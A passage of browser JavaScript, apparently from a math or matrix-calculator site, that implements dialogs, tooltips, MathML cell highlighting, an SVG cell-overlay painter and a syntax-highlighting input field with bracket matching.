  var checkElement = function (element) {
    if (element.hasAttributes()) { // for performance
      var initialized = element.getAttribute("data-i");
      if (initialized == undefined) {
        var classList = element.classList;
        if (classList != undefined) { // <math> in IE 11, Opera 12 (during the check for MathML support)
          var classListLength = classList.length;
          if (classListLength !== 0) {
            element.setAttribute("data-i", "1");
            var t = 0;
            for (var k = 0; k < classListLength; k += 1) {
              var className = classList[k];
              var callback = initializers[className];
              if (callback != undefined) {
                if (t > 0) {
                  throw new TypeError(classList.toString());
                }
                t += 1;
                callback(element);
              }
            }
          }
        }
      }
    }
  };
  
  var supportsAnimations = 'animation' in document.documentElement.style;

  var checkCustomPaint = function (element) {
    if (element.getAttribute("data-custom-paint") != undefined) {
      if (element.getAttribute("data-p") == undefined && element.getBoundingClientRect().top !== 0) {
        element.setAttribute("data-p", "1");
        var event = document.createEvent("Event");
        event.initEvent("custom-paint", true, false);
        element.dispatchEvent(event);
      }
    }
    //!
    if (!supportsAnimations) {
      var tagName = element.tagName.toLowerCase();
      if (tagName === 'mo' || tagName === 'mtable' || tagName === 'mi') {
        var event = document.createEvent('Event');
        event.initEvent('animationstart', true, false);
        element.dispatchEvent(event);
      }
    }
    //!
  };

  var checkSubtree = function (element) {
    checkElement(element);
    checkCustomPaint(element);
    var firstElementChild = element.firstElementChild;
    while (firstElementChild != undefined) {
      checkSubtree(firstElementChild);
      firstElementChild = firstElementChild.nextElementSibling;
    }
  };

  var started = false;

  PageUtils.initialize = function (selector, callback) {
    var className = selector.slice(1);
    if (started || initializers[className] != undefined) {
      throw new TypeError(className);
    }
    initializers[className] = callback;
  };

  var observe = function () {
    if (!started) {
      started = true;
      // some initializers can modify DOM, so it is important to call `checkSubtree` after `observer.observe`
      checkSubtree(document.body);
    }
  };

  document.addEventListener("DOMContentLoaded", function (event) {
    //TODO: remove
    var scriptVersion = '?20191021T205438Z';
    var htmlVersion = document.documentElement.getAttribute('data-version-tag');
    if ((document.body.getElementsByTagName("template").length === 0 || scriptVersion !== htmlVersion) && (window.location.protocol === 'http:' || window.location.protocol === 'https:') && Object.keys != null && Object.keys(initializers).length !== 0 && window.fetch != null) {
      // a workaround for a caching bug in browsers
      // https://bugs.chromium.org/p/chromium/issues/detail?id=899752 - ?
      // Chrome/70
      // also there are some another error in Firefox, seems
      // Chrome - only for http: protocol, seems
      // Firefox - any protocol - ? (https:)
      fetch("https://" + window.location.hostname + (window.location.port !== '' ? ':' + window.location.port : '') + window.location.pathname, {cache: "no-cache"}).then(function (response) {
        return response.text();
      }).then(function (text) {
        var parser = new DOMParser();
        var doc = parser.parseFromString(text, "text/html");
        document.body.innerHTML = doc.body.innerHTML;
        observe();
      });
    } else {
      observe();
    }
  }, false);

  // workaround for browsers, which do not support MutationObserver
  PageUtils.check = function (element) {
    checkSubtree(element);
  };

  PageUtils.check1 = function (element) {
    checkSubtree(element);
  };

  //Note: `Utils` is not a good name (somehow web clients may already have a variable with that name)
  globalThis.PageUtils = PageUtils;

}());

/*global document, window */

(function () {
  "use strict";

  function Dialog() {
  }

  Dialog.lastFocused = undefined; //?

  var ANIMATION_DURATION = 120;

  var idCounter = 0;

  var close = function (returnValue) {
    this.nativeClose(returnValue);
    var dialog = this;
    if (dialog.contains(document.activeElement) && Dialog.lastFocused != undefined) {
      Dialog.lastFocused.focus();
      Dialog.lastFocused = undefined;
    }
    if (dialog.animate != undefined) {
      dialog.style.display = "block";
      dialog.style.opacity = "0";
      dialog.style.transform = "scale(0.75)";
      dialog.animate([
        {transform: "scale(1.3333333333333333)", opacity: "1"},
        {transform: "scale(1)", opacity: "0"}
      ], {
        duration: ANIMATION_DURATION,
        composite: "add"
      });
      window.setTimeout(function () {
        dialog.style.display = "";
      }, ANIMATION_DURATION);
    }
    var backdrop = document.getElementById(this.getAttribute("data-backdrop-id"));
    if (backdrop != undefined) {
      if (backdrop.animate != undefined) {
        backdrop.style.opacity = "0";
        backdrop.animate([
          {opacity: "1"},
          {opacity: "0"}
        ], {
          duration: ANIMATION_DURATION,
          composite: "add"
        });
        window.setTimeout(function () {
          if (backdrop.parentNode != undefined) {
            document.body.removeChild(backdrop);
          }
        }, ANIMATION_DURATION);
      } else {
        document.body.removeChild(backdrop);
      }
    }
  };

  var show = function (anchorRect, anchorPoints, isModal) {
    var dialog = this;
    if (isModal || anchorRect != undefined || (anchorPoints != undefined && anchorPoints[1][0] === 1.0)) {
      if (Dialog.lastFocused == undefined) {
        Dialog.lastFocused = document.activeElement;
      }
    }
    var backdrop = undefined;
    if (isModal) {
      backdrop = document.createElement("div");
      backdrop.id = dialog.getAttribute("data-backdrop-id");
      backdrop.classList.toggle("backdrop", true);
      document.body.appendChild(backdrop);
    }

    dialog.style.visibility = "hidden";
    dialog.style.display = "block";
    dialog.style.transform = "scale(1)";
    dialog.style.right = "auto"; // Chrome 49 with html[dir="rtl"] uses 0px from right
    dialog.style.left = "0px";
    dialog.style.top = "0px";

    var style = window.getComputedStyle(dialog, undefined);
    // Note: previously applied animation may affect the rect returned by "Element#getBoundingClientRect()".
    var width = dialog.offsetWidth + Number.parseFloat(style.marginRight) + Number.parseFloat(style.marginLeft);
    var height = dialog.offsetHeight + Number.parseFloat(style.marginBottom) + Number.parseFloat(style.marginTop);

    var left = 0;
    var top = 0;
    if (anchorRect != undefined || anchorPoints != undefined) {
      if (anchorPoints != undefined) {
        left = anchorPoints[0][0] - width * anchorPoints[1][0];
        top = anchorPoints[0][1] - height * anchorPoints[1][1];
      } else {
        left = anchorRect.right;
        top = anchorRect.bottom;
        if (left > document.documentElement.clientWidth - width) {
          left = anchorRect.left - width;
        }
        if (top > document.documentElement.clientHeight - height) {
          top = anchorRect.top - height;
        }
      }
      if (anchorPoints == undefined || anchorPoints[1][0] !== 0.0) {
        left = Math.max(0, Math.min(left, document.documentElement.clientWidth - width));
        top = Math.max(0, Math.min(top, document.documentElement.clientHeight - height));
      }
      left += window.pageXOffset;
      top += window.pageYOffset;
      dialog.style.left = left.toString() + "px";
      dialog.style.top = top.toString() + "px";
    } else {
      left = window.pageXOffset + (window.innerWidth - width) / 2;
      top = window.pageYOffset + (window.innerHeight - height) / 2;
      dialog.style.left = Math.max(0, left).toString() + "px";
      dialog.style.top = Math.max(0, top).toString() + "px";
    }

    dialog.style.display = "";
    dialog.style.visibility = "";

    if (isModal) {
      dialog.nativeShowModal();
    } else {
      // "show" moves the focus (see highlight.js, reportValidity.js)
      //dialog.nativeShow();
      dialog.setAttribute("open", "open");
    }

    if (dialog.animate != undefined) {
      dialog.style.opacity = "1";
      dialog.style.transform = "scale(1)";
      dialog.animate([
        {transform: "scale(0.75)", opacity: "-1"},
        {transform: "scale(1)", opacity: "0"}
      ], {
        duration: ANIMATION_DURATION,
        composite: "add"
      });
    }
    if (isModal) {
      if (backdrop.animate != undefined) {
        backdrop.style.opacity = "1";
        backdrop.animate([
          {opacity: "-1"},
          {opacity: "0"}
        ], {
          duration: ANIMATION_DURATION,
          composite: "add"
        });
      }
    }
  };

  Dialog.create = function () {
    var dialog = document.createElement("dialog");
    if (dialog.initDialog != null) {
      dialog.initDialog();
    }
    dialog.nativeShowModal = dialog.showModal;
    //dialog.nativeShow = dialog.show;
    dialog.show = Dialog.prototype.show;
    dialog.showModal = Dialog.prototype.showModal;
    // bugs.chromium.org/p/chromium/issues/detail?id=380087 - close event was sync in Chrome 49 and is async now
    //dialog.addEventListener("close", onClose, false);
    dialog.nativeClose = dialog.close;
    dialog.close = Dialog.prototype.close;

    if (true) { // TODO: if cancel event is not supported - ?
      dialog.addEventListener("keydown", function (event) {
        var DOM_VK_ESCAPE = 27;
        if (event.keyCode === DOM_VK_ESCAPE && !event.ctrlKey && !event.altKey && !event.shiftKey && !event.metaKey && !event.defaultPrevented) {
          event.preventDefault();
          this.close(undefined);
        }
      }, false);
    }
    dialog.addEventListener("submit", function (event) {
      event.preventDefault();
      this.close(event.target.getAttribute("value"));
    }, false);
    dialog.addEventListener("cancel", function (event) {
      event.preventDefault();
      this.close(undefined);
    }, false);

    var backdropId = "backdrop" + (idCounter += 1).toString();
    dialog.setAttribute("data-backdrop-id", backdropId);
    return dialog;
  };

  Dialog.prototype.show = function (anchorRect, anchorPoints) {
    return show.call(this, anchorRect, anchorPoints, false);
  };

  Dialog.prototype.showModal = function (anchorRect, anchorPoints) {
    return show.call(this, anchorRect, anchorPoints, true);
  };

  Dialog.prototype.close = function (returnValue) {
    return close.call(this, returnValue);
  };

  // "Cancel", "OK", "Close"
  Dialog.standard = function (anchorRect, anchorPoints, contentHTML, buttonsHTML) {
    var dialog = Dialog.create();
    var contentId = "dialog-content";
    dialog.classList.toggle("standard-dialog", true);
    dialog.setAttribute("aria-describedby", contentId);
    //?
    dialog.innerHTML = "<form method=\"dialog\">" +
                       "<button type=\"submit\" class=\"close\">&times;</button>" +
                       "<div id=\"" + contentId + "\" class=\"content\">" + contentHTML + "</div>" +
                       "<div class=\"buttons\">" + buttonsHTML + "</div>" +
                       "</form>";
    document.body.appendChild(dialog);
    dialog.addEventListener("close", function (event) {
      window.setTimeout(function () {
        document.body.removeChild(dialog);
      }, 2000);
    }, false);
    dialog.showModal(anchorRect, anchorPoints);
    return dialog;
  };

  Dialog.alert = function (contentHTML) {
    window.setTimeout(function () { // hack to prevent the closing of new dialog immediately in Chrome
      Dialog.standard(undefined, undefined, contentHTML, "<button autofocus=\"autofocus\" type=\"submit\">OK</button>");
    }, 0);
  };

  //Dialog.promptNumber = function (title, min, max, callback) {
  //  var dialog = Dialog.standard(undefined, undefined, "<h3>" + title + "</h3>" + "<div><input type=\"number\" autofocus=\"autofocus\" required=\"required\" min=\"" + min + "\" max=\"" + max + "\" step=\"1\" /></div>", "<button autofocus=\"autofocus\" type=\"reset\">CANCEL</button><button type=\"submit\">OK</button>");
  //  dialog.addEventListener("close", function (event) {
  //    if (dialog.returnValue != undefined) {
  //      callback(dialog.querySelector("input").value);
  //    }
  //  }, false);
  //  return dialog;
  //};

  globalThis.Dialog = Dialog;
  
}());

/*global document, Dialog */

(function () {
  "use strict";

  var oldHighlights = undefined;
  var highlight = function (element) {
    if (oldHighlights != undefined) {
      for (var i = 0; i < oldHighlights.length; i += 1) {
        var t = document.getElementById(oldHighlights[i]);
        if (t != undefined) {
          t.removeAttribute("mathbackground");
        }
      }
      oldHighlights = undefined;
    }
    if (element != undefined) {
      var highlight = element.getAttribute("data-highlight"); // #id1, #id2, ...
      if (highlight != undefined) {
        var newHighlights = highlight.replace(/[#\s]/g, "").split(",");
        for (var j = 0; j < newHighlights.length; j += 1) {
          var e = document.getElementById(newHighlights[j]);
          if (e != undefined) {
            e.setAttribute("mathbackground", "#FAEBD7");
          }
        }
        oldHighlights = newHighlights;
      }
    }
  };

  var tooltip = null;

  var keyDownTarget = undefined;

  var onKeyDown = function (event) {
    var DOM_VK_ESCAPE = 27;
    if (event.keyCode === DOM_VK_ESCAPE && !event.ctrlKey && !event.altKey && !event.shiftKey && !event.metaKey && !event.defaultPrevented) {
      event.preventDefault();
      showTooltip(undefined);
    }
  };

  var showTooltip = function (element) {
    if (keyDownTarget != undefined) {
      keyDownTarget.removeEventListener("keydown", onKeyDown, false);
      keyDownTarget.removeAttribute("aria-describedby");
      keyDownTarget = undefined;
    }
    if (tooltip == null) {
      tooltip = Dialog.create();
      tooltip.id = "highlight-tooltip";
      tooltip.setAttribute("role", "tooltip");
      tooltip.classList.toggle("tooltip-dialog", true);
    }
    if (tooltip.getAttribute("open") != undefined) {
      tooltip.close();
    }
    if (element != undefined) {
      var tooltipId = element.getAttribute("data-tooltip");
      if (tooltipId != undefined) {
        keyDownTarget = document.getElementById(element.getAttribute("data-for"));
        var rect = keyDownTarget.getBoundingClientRect();
        keyDownTarget.setAttribute("aria-describedby", tooltip.id);
        keyDownTarget.addEventListener("keydown", onKeyDown, false);
        if (tooltip.parentNode == undefined) {
          document.body.appendChild(tooltip);
        }
        tooltip.textContent = "";
        var c = document.getElementById(tooltipId).cloneNode(true);
        while (c.firstChild != undefined) {
          tooltip.appendChild(c.firstChild);
        }
        //NOTE: "show" should not move the focus
        tooltip.show(undefined, [[(rect.left + rect.right) / 2, rect.top], [0.5, 1.0]]);
      }
    }
  };

  var f = function (highlight) {

    var hoveredElements = [];
    var focusedElements = [];

    return function (element) {
      var x = document.getElementById(element.getAttribute("data-for"));

      //!
      // The idea is to set tabindex="0" only for cells which have a tooltip or a "highlight"
      x.setAttribute("tabindex", "0");
      var tagName = x.tagName.toLowerCase();
      if (tagName === 'mrow' || tagName === 'mtd') {
        if (x.tabIndex == null) {
          x.setAttribute("href", "#");
        }
      } else {
        if (tagName !== 'a') {
          throw new RangeError(tagName);
        }
      }
      //!
      
      var highlightInternal = function () {
        highlight(hoveredElements.length !== 0 ? hoveredElements[hoveredElements.length - 1] : (focusedElements.length !== 0 ? focusedElements[focusedElements.length - 1] : undefined));
      };

      x.addEventListener("mouseenter", function (event) {
        hoveredElements.push(element);
        highlightInternal();
      }, false);
      x.addEventListener("mouseleave", function (event) {
        hoveredElements.pop();
        highlightInternal();
      }, false);
      x.addEventListener("focus", function (event) {
        focusedElements.push(element);
        highlightInternal();
      }, false);
      x.addEventListener("blur", function (event) {
        focusedElements.pop();
        highlightInternal();
      }, false);
    };

  };

  globalThis.initializeAHighlight = f(highlight);
  globalThis.initializeATooltip = f(showTooltip);

}());

/*global window, document, Dialog*/

window.reportValidity = function (input, validationMessage) {
  "use strict";
  var tooltip = Dialog.create();
  tooltip.setAttribute("role", "tooltip");
  tooltip.id = "report-validity-tooltip-for-" + input.id;
  tooltip.classList.toggle("tooltip", true);
  tooltip.classList.toggle("tooltip-dialog", true);//?
  var tooltipArrowId = "tooltip-arrow-" + input.id;
  tooltip.innerHTML = "<span class=\"exclamation\">!</span> " + validationMessage + "<div class=\"tooltip-arrow-wrapper\"><div id=\"" + tooltipArrowId + "\" class=\"tooltip-arrow\"></div></div>";
  document.body.appendChild(tooltip);

  input.setAttribute("aria-describedby", tooltip.id);
  input.focus();

  var inputRect = input.getBoundingClientRect();

  tooltip.style.visibility = "hidden";
  tooltip.style.display = "block";
  var rect = tooltip.getBoundingClientRect();
  var style = window.getComputedStyle(tooltip, undefined);
  var marginLeft = Number.parseFloat(style.marginLeft);
  var tooltipArrow = document.getElementById(tooltipArrowId);
  var arrowRect = tooltipArrow.getBoundingClientRect();
  tooltip.style.display = "";
  tooltip.style.visibility = "";

  var left = (inputRect.left + inputRect.right) / 2 - ((arrowRect.right - arrowRect.left) / 2 + marginLeft + arrowRect.left - rect.left);
  var top = inputRect.bottom + (arrowRect.bottom - arrowRect.top) * 0.15;
  // (17 + 2) * Math.SQRT2 / 2 + 0.25 * 17 + 1 + 0.5 * 17 - (17 + 2) * (Math.SQRT2 - 1) / 2
  // (17 + 2) * Math.SQRT2 * 0.15

  //NOTE: "show" should not move the focus
  tooltip.show(undefined, [[left, top], [0.0, 0.0]]);

  var close = undefined;
  var onKeyDown = undefined;
  var timeoutId = 0;

  close = function (event) {
    window.clearTimeout(timeoutId);
    input.removeEventListener("input", close, false);
    input.removeEventListener("blur", close, false);
    input.removeEventListener("keydown", onKeyDown, false);
    input.removeAttribute("aria-describedby");
    tooltip.id = ""; //! test case: trigger the tooltip twice
    tooltipArrow.id = "";
    tooltip.close();
    window.setTimeout(function () {
      tooltip.parentNode.removeChild(tooltip);
    }, 3000);
  };
  onKeyDown = function (event) {
    var DOM_VK_ESCAPE = 27;
    if (event.keyCode === DOM_VK_ESCAPE && !event.ctrlKey && !event.altKey && !event.shiftKey && !event.metaKey && !event.defaultPrevented) {
      event.preventDefault();
      close();
    }
  };
  timeoutId = window.setTimeout(function () {
    close(undefined);
  }, 4000);
  input.addEventListener("input", close, false);
  input.addEventListener("blur", close, false);
  input.addEventListener("keydown", onKeyDown, false);

};

/*global document*/

(function () {
  "use strict";

  function CustomMenclose() {
  }
  CustomMenclose.getPointByCell = function (paddingRect, rows, indexes) {
    var a = indexes[0];
    var b = indexes[1];
    var e = rows[a][b];
    var r = e.getBoundingClientRect();
    return {
      x: (r.left + r.right) / 2 - paddingRect.left,
      y: (r.top + r.bottom) / 2 - paddingRect.top
    };
  };
  CustomMenclose.paint = function (event) {
    var paddingRect = this.getBoundingClientRect();
    var width = paddingRect.right - paddingRect.left;
    var height = paddingRect.bottom - paddingRect.top;
    var svg = "";
    var cells = JSON.parse(this.getAttribute("data-cells"));
    var color = this.getAttribute("data-color");
    var strokeStyle = color === "0a" ? "#D64040" : (color === "0" ? "#F7D9D9" : (color === "1a" ? "#4040D6" : (color === "1" ? "#D9D9F7" : "")));
    var lineWidth = 1.25;
    var table = this.querySelector("mtable");
    var rows = [];
    var c = table.firstElementChild;
    while (c != undefined) {
      if (c.tagName.toLowerCase() === 'mtr') {
        var row = [];
        var t = c.firstElementChild;
        while (t != undefined) {
          if (t.tagName.toLowerCase() === 'mtd') {
            row.push(t);
          }
          t = t.nextElementSibling;
        }
        rows.push(row);
      }
      c = c.nextElementSibling;
    }
    for (var i = 0; i < cells.length; i += 1) {
      var p1 = CustomMenclose.getPointByCell(paddingRect, rows, cells[i]);
      var p2 = CustomMenclose.getPointByCell(paddingRect, rows, i === cells.length - 1 ? cells[0] : cells[i + 1]);
      svg += "<line x1=\"" + p1.x.toString() + "\" y1=\"" + p1.y.toString() + "\" x2=\"" + p2.x.toString() + "\" y2=\"" + p2.y.toString() + "\" stroke=\"" + strokeStyle + "\" stroke-width=\"" + lineWidth.toString() + "\" />";
    }
    var backgroundImage = "data:image/svg+xml;charset=utf-8," + encodeURIComponent("<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"" + width + "\" height=\"" + height + "\" viewBox=\"0 0 " + width + " " + height + "\">" + svg + "</svg>");
    this.style.backgroundImage = "url(\"" + backgroundImage + "\")";
    this.style.backgroundSize = "auto auto";
  };

  document.addEventListener("custom-paint", function (event) {
    if (event.target.getAttribute("data-custom-paint") === "custom-menclose") {
      CustomMenclose.paint.call(event.target, event);
    }
  }, false);

}());

/*global window, document, console*/

//TODO: optimize

(function () {
  "use strict";

var initializeAInput = function (container) {
  var input = container.firstElementChild;
  if (input.tagName.toLowerCase() !== 'input' && input.tagName.toLowerCase() !== 'textarea') {
    throw new TypeError();
  }
  var idPrefix = input.id + '=';

  // see https://github.com/kueblc/LDT

  var inputStyle = window.getComputedStyle(input, undefined);

  // FF does not like font
  var fontSize = inputStyle.fontSize;
  var fontFamily = inputStyle.fontFamily;
  var fontWeight = inputStyle.fontWeight;
  var lineHeight = inputStyle.lineHeight;
  var textAlign = inputStyle.textAlign;

  var marginLeft = Number.parseFloat(inputStyle.marginLeft);
  var marginTop = Number.parseFloat(inputStyle.marginTop);
  var marginRight = Number.parseFloat(inputStyle.marginRight);
  var marginBottom = Number.parseFloat(inputStyle.marginBottom);
  var paddingLeft = Number.parseFloat(inputStyle.paddingLeft);
  var paddingTop = Number.parseFloat(inputStyle.paddingTop);
  var paddingRight = Number.parseFloat(inputStyle.paddingRight);
  var paddingBottom = Number.parseFloat(inputStyle.paddingBottom);

  // when the width of a textarea is small, paddingRight will not be included in scrolling area,
  // but this is not true for an input, in Firefox - for both
  // see https://developer.mozilla.org/en-US/docs/Mozilla/Gecko/Chrome/CSS/overflow-clip-box
  if (input.tagName.toLowerCase() === "input") {
    // Firefox, Edge, Chrome
    marginLeft += paddingLeft;
    marginTop += paddingTop;
    marginRight += paddingRight;
    marginBottom += paddingBottom;
    paddingLeft = 0;
    paddingTop = 0;
    paddingRight = 0;
    paddingBottom = 0;
  } else {
    if (paddingRight !== 0 || paddingBottom !== 0) {
      console.warn("Set paddingRight and paddingBottom to zero for <textarea> elements");
    }
  }

  var backgroundElement = document.createElement("div");
  backgroundElement.style.fontSize = fontSize;
  backgroundElement.style.fontFamily = fontFamily;
  backgroundElement.style.fontWeight = fontWeight;
  backgroundElement.style.lineHeight = lineHeight;
  backgroundElement.style.textAlign = textAlign;
  backgroundElement.style.paddingLeft = paddingLeft + "px";
  backgroundElement.style.paddingTop = paddingTop + "px";
  backgroundElement.style.paddingRight = paddingRight + "px";
  backgroundElement.style.paddingBottom = paddingBottom + "px";
  window.setTimeout(function () { // relayout
    container.insertBefore(backgroundElement, input);
  }, 0);

  var updateTokenNode = function (span, text, tokenClassName, className) {
    var classList = span.classList;
    for (var i = 0; i < classList.length; i += 1) {
      if (classList[i] !== tokenClassName && classList[i] !== className) {
        classList.toggle(classList[i], false);
      }
    }
    if (tokenClassName != null) {
      span.classList.toggle(tokenClassName, true);
    }
    if (className != null) {
      span.classList.toggle(className, true);
    }
    span.textContent = text;
  };
  
  var add = function (text, tokenClassName, className, div) {
    var span = document.createElement("span");
    updateTokenNode(span, text, tokenClassName, className);
    div.appendChild(span);
  };

  var getBracketMarks = function (value, inputSelectionStart) {
    var selectionStart = inputSelectionStart - 1;
    var c = 0;
    var step = 0;
    var n = selectionStart + 2;
    var pair = 0;
    while (step === 0 && selectionStart < n) {
      c = value.charCodeAt(selectionStart);
      var brackets = "(){}[]";
      for (var k = 0; k < brackets.length; k += 2) {
        if (c === brackets.charCodeAt(k)) {
          pair = brackets.charCodeAt(k + 1);
          step = +1;
        }
        if (c === brackets.charCodeAt(k + 1)) {
          pair = brackets.charCodeAt(k);
          step = -1;
        }
      }
      selectionStart += 1;
    }
    selectionStart -= 1;
    if (step !== 0) {
      var i = selectionStart;
      var depth = 1;
      i += step;
      while (i >= 0 && i < value.length && depth > 0) {
        var code = value.charCodeAt(i);
        if (code === c) {
          depth += 1;
        }
        if (code === pair) {
          depth -= 1;
        }
        i += step;
      }
      i -= step;
      if (depth === 0) {
        return {
          first: {start: selectionStart, end: selectionStart + 1, className: "bracket-mark"},
          second: {start: i, end: i + 1, className: "bracket-mark"}
        };
      } else {
        return {
          first: {start: selectionStart, end: selectionStart + 1, className: "odd-bracket-mark"},
          second: undefined
        };
      }
    }
    return {
      first: undefined,
      second: undefined
    };
  };

  var updateMargins = function () {
    var clientLeft = input.clientLeft;
    var clientTop = input.clientTop;
    var inputRect = input.getBoundingClientRect();
    var clientRight = inputRect.right - inputRect.left - input.clientWidth - input.clientLeft;
    var clientBottom = inputRect.bottom - inputRect.top - input.clientHeight - input.clientTop;

    backgroundElement.style.marginLeft = (clientLeft + marginLeft).toString() + "px";
    backgroundElement.style.marginTop = (clientTop + marginTop).toString() + "px";
    backgroundElement.style.marginRight = (clientRight + marginRight).toString() + "px";
    backgroundElement.style.marginBottom = (clientBottom + marginBottom).toString() + "px";
  };

  var updateLine = function (line, marks, lineNode) {
    //lineNode.textContent = '';
    var tokenNode = lineNode.firstElementChild;
    var tokenizer = new Tokenizer(line, 0, null);
    var token = null;
    var position = 0;
    while ((token = tokenizer.next()).type !== 'EOF') {
      var className = null;
      for (var i = 0; i < marks.length; i += 1) {
        var m = marks[i];
        if (m.start >= position && m.end <= position + token.value.length) {
          className = m.className;
        }
      }
      if (tokenNode == null) {
        tokenNode = document.createElement('span');
        lineNode.appendChild(tokenNode);
      }
      //TODO: move ?
      var type = token.type === 'symbol' && /^pi|[eiEIU]$/.test(token.value) ? 'special-symbol' : token.type;
      updateTokenNode(tokenNode, token.value, type, className);
      position += token.value.length;
      tokenNode = tokenNode.nextElementSibling;
    }
    while (tokenNode != null) {
      var next = tokenNode.nextElementSibling;
      tokenNode.parentNode.removeChild(tokenNode);
      tokenNode = next;
    }
    //TODO: EOF?

/*
    var start = 0;
    var end = line.length;
    
    for (var i = 0; i < marks.length; i += 1) {
      var m = marks[i];
      var s = m.start > start ? m.start : start;
      var e = m.end < end ? m.end : end;
      if (s < e) {
        add(line.slice(start, s), null, null, lineNode);
        add(line.slice(s, e), null, m.className, lineNode);
        start = e;
      }
    }
    if (start < end) {
      add(line.slice(start, end), null, null, lineNode);
      start = end;
    }
*/
    if (input.getAttribute("list") != undefined && textAlign !== 'center') {
      add("  ", null, null, lineNode); // to increase scrollWidth in Chrome
    }
  };
  
  var map = {};
  var idCounter = -1;

  var update = function (event) {
    var marks = [];
    var tmp0 = getBracketMarks(input.value, input.selectionStart);
    if (tmp0.first != undefined) {
      marks.push(tmp0.first);
    }
    if (tmp0.second != undefined) {
      marks.push(tmp0.second);
    }
    var error = input.getAttribute("data-error");
    if (error != undefined) {
      marks.push({start: Number.parseInt(error.split(",")[0], 10), end: Number.parseInt(error.split(",")[1], 10), className: "error-mark"});
    }
    marks.sort(function (a, b) {
      return a.start < b.start ? -1 : (b.start < a.start ? +1 : 0);
    });

      backgroundElement.setAttribute('dir', input.getAttribute('dir') || 'ltr');
      var scrollLeft = input.scrollLeft;
      var scrollTop = input.scrollTop;
      updateMargins();

      var value = input.value;
      var lines = value.split('\n');
      var start = 0;
      var node = backgroundElement.firstElementChild;
      for (var j = 0; j < lines.length; j += 1) {
        if (node == null) {
          node = document.createElement("div");
          node.id = idPrefix + (++idCounter);
          map[node.id] = {line: null, lineMarks: null};
          backgroundElement.appendChild(node);
        }
        var div = node;
        var line = lines[j];
        var lineMarks = [];
        for (var i = 0; i < marks.length; i += 1) {
          var m = marks[i];
          var s = Math.max(m.start - start, 0);
          var e = Math.min(m.end - start, line.length + '\n'.length);
          if (s < e) {
            lineMarks.push({start: s, end: e, className: m.className});
          }
        }
        var data = map[div.id];
        if (line !== data.line || JSON.stringify(lineMarks) !== JSON.stringify(data.lineMarks)) {
          //Note: empty lines are collapsed
          //Note: extra whitespace/newline may work not well with text-align inequal to 'start'
          updateLine(line || ' ', lineMarks, div);
          data.line = line;
          data.lineMarks = lineMarks;
        }
        start += line.length + '\n'.length;
        node = node.nextElementSibling;
      }
      while (node != undefined) {
        var next = node.nextElementSibling;
        delete map[node.id];
        backgroundElement.removeChild(node);
        node = next;
      }

      backgroundElement.scrollLeft = scrollLeft;
      backgroundElement.scrollTop = scrollTop;
  };

  var updateMarks = function () {
    update(undefined);
  };

  var oldSelectionStart = -1;
  var timeoutId = 0;
  var checkSelectionChange = function (event) {
    if (timeoutId === 0) {
      timeoutId = window.setTimeout(function () { // selectionStart is not changed yet for mousedown event
        timeoutId = 0;
        var newSelectionStart = input.selectionStart;
        if (oldSelectionStart !== newSelectionStart) {
          oldSelectionStart = newSelectionStart;
          updateMarks();
        }
      }, 0);
    }
  };
  // https://github.com/w3c/selection-api/issues/53
  // selectionchange
  input.addEventListener("selectionchange", checkSelectionChange, false);

  input.addEventListener("keydown", checkSelectionChange, false);
  input.addEventListener("mousedown", checkSelectionChange, false);
  input.addEventListener("mouseup", checkSelectionChange, false);
  input.addEventListener("mousemove", checkSelectionChange, false);
  input.addEventListener("touchmove", checkSelectionChange, false);
  input.addEventListener("input", checkSelectionChange, false);
  input.addEventListener("focus", checkSelectionChange, false);
  input.addEventListener("blur", checkSelectionChange, false);
  input.addEventListener("wheel", checkSelectionChange, false); // Shift + mousewheel
  input.addEventListener("dragover", checkSelectionChange, false); // https://stackoverflow.com/questions/27713057/event-to-detect-when-the-text-in-an-input-is-scrolled

  input.addEventListener("input", update, false);
  input.addEventListener("update-attribute", function (event) {
    updateMarks();
  }, false);
  var timeoutId2 = 0;
  var onScroll = function (event) {
    if (timeoutId2 === 0) {
      timeoutId2 = window.setTimeout(function () {
        timeoutId2 = 0;
        var scrollLeft = input.scrollLeft;
        var scrollTop = input.scrollTop;
        backgroundElement.scrollLeft = scrollLeft;
        backgroundElement.scrollTop = scrollTop;
      }, 0);
    }
  };
  input.addEventListener("scroll", onScroll, false);

  if (input.tagName.toLowerCase() === 'input') {
  // as the "scroll" event is not supported on Chrome
  input.addEventListener("keydown", onScroll, false);
  input.addEventListener("mousedown", onScroll, false);
  input.addEventListener("mouseup", onScroll, false);
  input.addEventListener("mousemove", onScroll, false);
  input.addEventListener("touchmove", onScroll, false);
  input.addEventListener("input", onScroll, false);
  input.addEventListener("focus", onScroll, false);
  input.addEventListener("blur", onScroll, false);
  input.addEventListener("wheel", onScroll, false); // Shift + mousewheel
  input.addEventListener("dragover", onScroll, false); // https://stackoverflow.com/questions/27713057/event-to-detect-when-the-text-in-an-input-is-scrolled
  }

  container.classList.toggle('focus-within', document.activeElement === input);
  input.addEventListener("focus", function (event) {
    container.classList.toggle('focus-within', true);
  }, false);
  input.addEventListener("blur", function (event) {
    container.classList.toggle('focus-within', false);
  }, false);

  update(undefined);
};

window.initializeAInput = initializeAInput;

  // document.hasFocus is not a function in Opera Mini
  document.documentElement.classList.toggle('focus-within', document.hasFocus != null ? document.hasFocus() : true);
  window.addEventListener("focus", function (event) {
    document.documentElement.classList.toggle('focus-within', true);
  }, false);
  window.addEventListener("blur", function (event) {
    document.documentElement.classList.toggle('focus-within', false);
  }, false);

}());

/*global window, document, unescape, hit, Node */

// deprecated

(function () {
"use strict";

function ItemsStorage(keyStorage, itemUpdater) {
  this.keyStorage = keyStorage;
  this.itemUpdater = itemUpdater;
}
ItemsStorage.prototype._save = function (items) {
  var data = [];
  for (var i = 0; i < items.length; i += 1) {
    var x = items[i];
    if (x != undefined) {
      data.push(x);
    }
  }
  var keyStorage = this.keyStorage;
  var save = function (limit) {
    if (data.length > limit) {
      var newData = new Array(limit);
      for (var j = 0; j < limit; j += 1) {
        newData[j] = data[data.length - limit + j];
      }
      data = newData;
    }
    var valueToSave = JSON.stringify(data);
    keyStorage.setItem("resdiv", valueToSave);
    var value = keyStorage.getItem("resdiv");
    if (value !== valueToSave && limit > 1 && valueToSave.length > 1024 * 1024) {
      return save(Math.floor(limit / 2));
    }
    return undefined;
  };
  return save(data.length);
};
ItemsStorage.prototype._load = function () {
  var parseJSONArraySafely = function (value) {
    try {
      // old data ?
      var result = JSON.parse(value);
      if (!(result instanceof Array)) {
        throw new RangeError();
      }
      return result;
    } catch (error) {
      window.setTimeout(function () {
        throw error;
      }, 0);
    }
    return [];
  };
